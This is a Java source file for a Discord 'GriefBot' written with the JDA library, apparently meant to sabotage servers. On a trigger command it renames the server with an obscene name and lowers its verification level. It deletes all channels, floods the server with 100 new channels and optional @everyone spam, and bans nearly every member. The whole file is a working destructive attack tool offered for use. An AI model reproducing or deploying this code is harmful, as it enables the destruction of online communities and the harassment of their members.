package me.corruptedbytes;

import java.io.File;
import java.io.IOException;

import net.dv8tion.jda.api.entities.ChannelType;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Guild.VerificationLevel;
import net.dv8tion.jda.api.entities.Icon;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.TextChannel;
import net.dv8tion.jda.api.entities.User;
import net.dv8tion.jda.api.events.ReadyEvent;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

public class GriefBotListener extends ListenerAdapter {
	
	@Override
	public void onReady(ReadyEvent e) {
		System.out.println("Discord-GriefBOT started by CorruptedBytes");
	}
	
	
	@Override
	public void onMessageReceived(MessageReceivedEvent e) {
		if (e.isFromType(ChannelType.TEXT)) {
			String msg = e.getMessage().getContentDisplay();
			User s = e.getMessage().getAuthor();
			Guild g = e.getGuild();
						
			if (msg.equalsIgnoreCase(GriefBot.instance.griefCommand) && GriefBot.instance.griefType == GriefType.COMMAND) {
				try {
					startGrief(g, s);
				} catch (Exception ignored) {}
			}
		}
	}
	
	public void startGrief(Guild g, User s) throws IOException {
		g.getManager().setName("FUCKED-BY-" + s.getName());
		g.getManager().setIcon(Icon.from(new File("griefed.png"))).queue();
		g.getManager().setVerificationLevel(VerificationLevel.NONE).queue();
		g.getChannels().forEach(key -> {
			key.delete().queue();
		});				
		TextChannel ch = (TextChannel) g.createTextChannel("fucked").complete();

		for (int i = 0; i < 100; i++) {
			g.createTextChannel("fucked-by-" + s.getName()).queue();
		}
		
		if (GriefBot.instance.raidMod) {
			for (int i = 0; i < 100; i++) {
				ch.sendMessage("@everyone YOUR DISCORD SERVER WAS GRIEFED BY " + s.getName()).queue();
				ch.sendFile(new File("griefed.png")).queue();
			}
		}
		
		for (Member members : g.getMembers()) {
			if (members.isOwner() || members.getUser().isBot() || members.getId() == GriefBot.instance.grieferUserID) {
				continue;
			} else {
				members.getGuild().ban(members.getUser(), 7, "fucked-by-" + s.getName()).queue();
			}
		}
		
	}
}